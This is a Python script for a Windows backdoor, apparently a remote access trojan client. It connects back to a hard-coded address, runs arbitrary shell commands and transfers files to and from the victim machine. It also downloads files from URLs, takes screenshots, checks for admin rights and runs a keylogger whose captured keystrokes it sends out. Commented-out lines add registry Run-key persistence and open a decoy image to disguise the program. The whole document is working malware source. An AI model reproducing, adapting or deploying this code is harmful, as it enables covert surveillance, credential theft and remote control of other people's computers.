#!/usr/bin/python
import socket
import json
import subprocess
import time
import os
import shutil
import sys
import base64
import requests
import ctypes
import threading
import keylogger
from mss import mss

def screenshot():
	with mss() as screenshot:
		screenshot.shot()

def download(url):
	server_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as write_file:
		write_file.write(server_response.content)

def reliable_send(data):
	json_data = json.dumps(data)
	sock.send(json_data)

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + sock.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue

def has_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'), 'temp']))
	except:
		admin = '[-]This user does NOT have Admin privileges[-]'
	else:
		admin = '[+]This user HAS Admin privileges[+]'




def connection():
	while True:
		time.sleep(10)
		try:
			sock.connect(('192.168.0.14', 12345))
			shell()
		except:
			connection()

def shell():
	while True:
		command = reliable_recv()
		if command == 'q':
			try:
				os.remove(keys_path)
			except:
				continue
			break
		elif command [:2] == 'cd' and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == 'download':
			with open(command[9:], 'rb') as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] == 'upload':
			with open(command[7:], 'wb') as up:
				result = reliable_recv()
				up.write(base64.b64decode(result))
				
		elif command[:3] == 'get':
			try: 
				download(command[4:])
				reliable_send('[+] The file you have specified has been downloaded [+]')
			except:
				reliable_send('[-] Failed to download file [-]')
		elif command[:5] == 'start':
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send('[+] The process has started... [+]')
			except:
				reliable_send('[-] Could not start process [-]')
		elif command[:10] == 'screenshot':
			try:
				screenshot()
				with open("monitor-1.png", "rb") as sc:
					reliable_send(base64.b64encode(sc.read()))
				os.remove("monitor-1.png")
			except:
                      		reliable_send("[!!] Failed to capture screenshot [!!]")
		elif command[:5] == 'check':
			try:
				has_admin()
				reliable_send(admin)
			except:
				reliable_send('[!!]Check failed[!!]')
		elif command[:9] == 'keylogger':
			thread1 = threading.Thread(target=keylogger.start_keylogger)
			thread1.start()
		elif command[:9] == 'dump_keys':
			dump = open(keys_path, "r")
			reliable_send(dump.read())
		elif command[:4] == 'help':
			reliable_send('''	
                                          screenshot     -> take screenshot of target pc
		                          upload[path]   -> uploads file to target pc
                                          download[path] -> downloads file from target pc
                                          get[url]       -> downloads file from url
                                          check          -> checks for admin privileges
				          start[process] -> starts process on target pc
                                          q              -> exits session 
					  keylogger      -> starts keylogger
					  dump_keys      -> displays recorded key stroked ''')
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result)
			except:
				reliable_send('!!!could not execute command!!!')
				continue


keys_path = os.environ["appdata"] + "\\keys.txt"
#location = os.environ["appdata"] + "\\Backdoor.exe"    #Stuff for persistence
#if not os.path.exists(location):
   #	shutil.copyfile(sys.executable, location)
   # 	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
   #	name = sys._MEIPASS + "\cutecat.jpg"
   #	try:
   #		subprocess.Popen(name, shell=True)
   #	except:
   #		add = 1 + 2 


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
sock.close()





